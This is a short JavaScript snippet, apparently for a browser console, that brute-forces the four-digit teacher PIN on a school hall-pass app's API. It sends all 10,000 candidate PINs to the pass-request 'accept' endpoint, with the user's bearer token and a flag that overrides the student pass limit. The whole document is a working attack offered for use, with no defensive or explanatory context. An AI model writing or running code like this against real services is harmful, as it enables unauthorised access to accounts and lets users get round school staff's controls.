{
  let bearer = ""
  let school_id = ""
  let pass_id = ""
  let s = ""
  for (let i = 0; i < 10000; i++) {
    if (i < 10) {
      s = "000" + i
    } else if (i < 100) {
      s = "00" + i
    } else if (i < 1000) {
      s = "0" + i
    } else {
      s = "" + i
    }
    fetch("https://smartpass.app/api/prod-us-central/v1/pass_requests/" + pass_id + "/accept", {
      "headers": {
        "accept": "application/json, text/plain, */*",
        "authorization": "Bearer " + bearer,
        "build-date": "Mon Dec 12 14:29:29 UTC 2022",
        "build-release-name": "5fb562088780a3f2b91d09165a238d83e35b701e",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryUqpRMrBzAUOWqbqR",
        "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "x-school-id": school_id
      },
      "referrer": "https://smartpass.app/app/main/passes",
      "referrerPolicy": "strict-origin-when-cross-origin",
      "body": "------WebKitFormBoundaryUqpRMrBzAUOWqbqR\r\nContent-Disposition: form-data; name=\"teacher_pin\"\r\n\r\n" + s + "\r\n------WebKitFormBoundaryUqpRMrBzAUOWqbqR\r\nContent-Disposition: form-data; name=\"overrode_student_pass_limit\"\r\n\r\ntrue\r\n------WebKitFormBoundaryUqpRMrBzAUOWqbqR--\r\n",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    });
  }
}
